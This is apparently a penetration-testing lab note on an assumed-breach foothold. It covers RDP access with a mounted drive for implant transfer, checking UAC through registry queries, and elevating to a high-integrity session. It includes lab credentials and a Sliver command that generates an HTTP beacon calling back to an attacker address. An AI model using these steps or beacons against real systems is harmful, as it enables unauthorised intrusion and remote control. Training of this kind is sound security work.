# 15.03 Assumed Breach Initial Foothold RDP UAC Enumeration

> Drop in via RDP with mounted local drive for implant transfer; check UAC registry before attempting `getsystem`.

## Overview

In an assumed-breach scenario the operator is given credentials and RDP access. Mount a local drive to transfer implants. Enumerate UAC state via registry before attempting getsystem. Credentials: eric / Letmein123 / child.htb.local.

## Steps

- Connect via xfreerdp with /drive to mount a local share for payload delivery.
- Check local admin membership: `net localgroup Administrators`.
- Check mandatory integrity level with `whoami /groups` — medium = UAC active.
- Query UAC registry keys: EnableLUA and ConsentPromptBehaviorAdmin.
- ConsentPromptBehaviorAdmin = 0x0 means elevation without consent — exploitable.
- Generate and transfer beacon; right-click Run as Administrator to get high-integrity beacon.

## Commands

### RDP with drive mount

```bash
xfreerdp /v:<TARGET_IP> /u:eric /p:Letmein123 /d:child.htb.local /dynamic-resolution /cert-ignore /drive:academy,$(pwd)
```

### Check local admin group

```powershell
PS C:\Users\eric> net localgroup Administrators
```

### Check integrity level

```powershell
PS C:\Users\eric> whoami /groups
```

### Query EnableLUA

```powershell
PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

### Query ConsentPromptBehaviorAdmin

```powershell
PS C:\Users\eric> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### Generate beacon for assumed breach

```text
sliver > generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows -N http-beacon-9001
```
